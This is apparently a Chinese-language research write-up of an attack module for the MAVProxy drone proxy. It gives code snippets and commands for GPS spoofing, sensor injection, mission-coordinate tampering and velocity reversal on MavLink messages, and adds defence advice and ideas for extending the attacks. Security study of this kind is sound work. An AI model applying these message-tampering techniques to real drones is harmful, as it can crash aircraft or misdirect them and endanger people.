# MAVProxy 攻击模块分析

## 概述

攻击文件路径：
/home/ros/Attacker_MavLink_liyi_0307/Attacker/MAVProxy/attack.py

`attack.py` 是 MAVProxy 的一个攻击模块，用于模拟和测试无人机通信系统中的各种安全威胁。该模块可以拦截、修改和注入 MavLink 消息，实现多种类型的攻击。

## 模块结构

### 类定义
```python
class AttackModule(mp_module.MPModule):
```
继承自 `mp_module.MPModule`，实现了 MAVProxy 模块的标准接口。

### 初始化参数
- `hardware_backdoor`: 硬件后门攻击开关
- `message_modification`: 消息修改攻击开关
- `gps_spoofing`: GPS 欺骗攻击开关
- `gps`: GPS 攻击开关
- `gps2`: GPS 攻击备用开关
- `sensor_injection`: 传感器注入攻击开关
- `sensor_modification`: 传感器修改攻击开关
- `injection`: 通用注入攻击开关
- `gcs_spoof`: 地面站欺骗攻击开关
- `reverse_velocity`: 速度反向攻击开关

## 攻击类型详解

### 1. 硬件后门攻击 (Hardware Backdoor)

**功能**: 修改执行器控制信号
**实现方式**: 
```python
if self.hardware_backdoor:
    msg_type = m.get_type()
    if msg_type == "HIL_ACTUATOR_CONTROLS":
        m.controls[0] += 0.96  # 修改第一个控制信号
        m.pack(mav)
```

**攻击效果**: 
- 在 HIL_ACTUATOR_CONTROLS 消息中注入偏移量
- 影响无人机的飞行控制，可能导致不稳定飞行

**使用方法**:
```bash
attack hardware_backdoor on
attack hardware_backdoor off
```

### 2. 消息修改攻击 (Message Modification)

**功能**: 修改任务项消息
**实现方式**:
```python
if self.message_modification:
    if m.get_type() == "MISSION_ITEM_INT":
        m.__init__(m.target_system, m.target_component, m.seq, m.frame, m.command, m.current,
                   m.autocontinue, m.param1, m.param2, m.param3, m.param4, m.x+3000, m.y+3000, m.z, m.mission_type)
        m.pack(mav)
```

**攻击效果**:
- 修改任务坐标，在 x 和 y 方向上增加 3000 单位
- 导致无人机飞向错误的目标位置

**使用方法**:
```bash
attack message_modification
```

### 3. 传感器修改攻击 (Sensor Modification)

**功能**: 修改传感器数据
**实现方式**:
```python
if self.sensor_modification:
    msg_type = m.get_type()
    if msg_type == "HIL_SENSOR":
        if m.id == 0:
            m.__init__(m.time_usec, m.xacc, m.yacc, m.zacc, m.xgyro, m.ygyro, m.zgyro, m.xmag, m.ymag, m.zmag, 
                      m.abs_pressure, m.diff_pressure, m.pressure_alt, m.temperature, m.fields_updated)
            m.pack(mav)
```

**攻击效果**:
- 修改 HIL_SENSOR 消息中的传感器数据
- 影响无人机的姿态估计和导航

**使用方法**:
```bash
attack sensor_modification on
attack sensor_modification off
```

### 4. 传感器注入攻击 (Sensor Injection)

**功能**: 注入虚假传感器数据
**实现方式**:
```python
if self.sensor_injection:
    if m.get_type() == "HIL_SENSOR":
        new_mav = self.mpstate.mav_master[0].mav
        new_mav.srcSystem = 1
        new_mav.srcComponent = 1
        new_mav.hil_sensor_send(m.time_usec-1, 0.1, 0.1, 0.1, 0, 0, 0,
                               1, 1, 1, -3.94092e+29, 4.58141e-41, -9.61733e-41, 4.58127e-36, 63, 0)
```

**攻击效果**:
- 注入带有异常值的传感器数据
- 可能导致导航系统故障

**使用方法**:
```bash
attack sensor_injection
```

### 5. GPS 攻击 (GPS Attack)

**功能**: 修改 GPS 坐标数据
**实现方式**:
```python
if self.gps:
    msg_type = m.get_type()
    if msg_type == "HIL_GPS":
        if m.id == 0:
            m.lon += 1000  # 经度偏移
            m.lat += 1000  # 纬度偏移
            m.pack(mav)
```

**攻击效果**:
- 修改 GPS 坐标，在经纬度上各增加 1000 单位
- 导致无人机定位错误

**使用方法**:
```bash
attack gps on
attack gps off
```

### 6. 地面站欺骗攻击 (GCS Spoofing)

**功能**: 修改全局位置信息
**实现方式**:
```python
if self.gcs_spoof:
    if m.get_type() == "GLOBAL_POSITION_INT":
        if not self.has_copied:
            self.newlat = m.lat
            self.newlon = m.lon
            self.has_copied = True
        m.lon = self.newlon
        m.lat = self.newlat
        m.__init__(m.time_boot_ms, m.lat, m.lon, m.alt, m.relative_alt, m.vx, m.vy, m.vz, m.hdg)
        m.pack(mav)
```

**攻击效果**:
- 固定全局位置坐标
- 阻止位置更新，导致导航系统使用过时信息

**使用方法**:
```bash
attack gcs on
attack gcs off
```

### 7. 速度反向攻击 (Reverse Velocity)

**功能**: 反转速度指令
**实现方式**:
```python
if self.reverse_velocity:
    if m.get_type() == "SET_POSITION_TARGET_LOCAL_NED":
        m.vx = -m.vx  # 反转 x 方向速度
        m.vy = -m.vy  # 反转 y 方向速度
        m.__init__(m.time_boot_ms, m.target_system, m.target_component, m.coordinate_frame, m.type_mask,
                   m.x, m.y, m.z, m.vx, m.vy, m.vz, m.afx, m.afy, m.afz, m.yaw, m.yaw_rate)
        m.pack(mav)
```

**攻击效果**:
- 反转速度指令的方向
- 导致无人机向相反方向飞行

**使用方法**:
```bash
attack reverse_velocity
```

## 消息处理机制

### mavlink_packet 方法
处理从主设备（通常是无人机）发送到从设备（通常是地面站）的消息。

### mavlink_backward 方法
处理从从设备发送到主设备的消息。

## 使用示例

### 启动攻击模块
```bash
# 在 MAVProxy 中加载攻击模块
module load attack

# 启用硬件后门攻击
attack hardware_backdoor on

# 启用 GPS 攻击
attack gps on

# 启用传感器修改
attack sensor_modification on

# 启用地面站欺骗
attack gcs on
```

### 组合攻击
```bash
# 同时启用多种攻击
attack hardware_backdoor on
attack gps on
attack sensor_modification on
attack reverse_velocity
```

## 安全注意事项

1. **仅用于测试**: 此模块仅用于安全研究和测试目的
2. **环境隔离**: 应在隔离的测试环境中使用
3. **权限控制**: 确保只有授权人员可以访问
4. **日志记录**: 建议记录所有攻击活动用于分析

## 防御建议

1. **消息验证**: 实现 MavLink 消息的完整性验证
2. **异常检测**: 监控传感器数据的异常变化
3. **位置验证**: 验证 GPS 坐标的合理性
4. **加密通信**: 使用加密的通信协议
5. **冗余系统**: 实现多个传感器和导航系统的冗余

## 技术细节

### 消息类型
- `HIL_ACTUATOR_CONTROLS`: 硬件在环执行器控制
- `MISSION_ITEM_INT`: 任务项消息
- `HIL_SENSOR`: 硬件在环传感器数据
- `HIL_GPS`: 硬件在环 GPS 数据
- `GLOBAL_POSITION_INT`: 全局位置信息
- `SET_POSITION_TARGET_LOCAL_NED`: 位置目标设置

### 坐标系统
- 使用 NED (North-East-Down) 坐标系
- GPS 坐标使用 WGS84 标准

## 扩展建议

1. **添加更多攻击类型**: 如拒绝服务攻击、重放攻击等
2. **实现攻击强度调节**: 允许调节攻击的影响程度
3. **添加时间控制**: 实现定时攻击功能
4. **增加日志功能**: 记录攻击的详细信息和效果
5. **实现攻击组合**: 支持预设的攻击组合模式 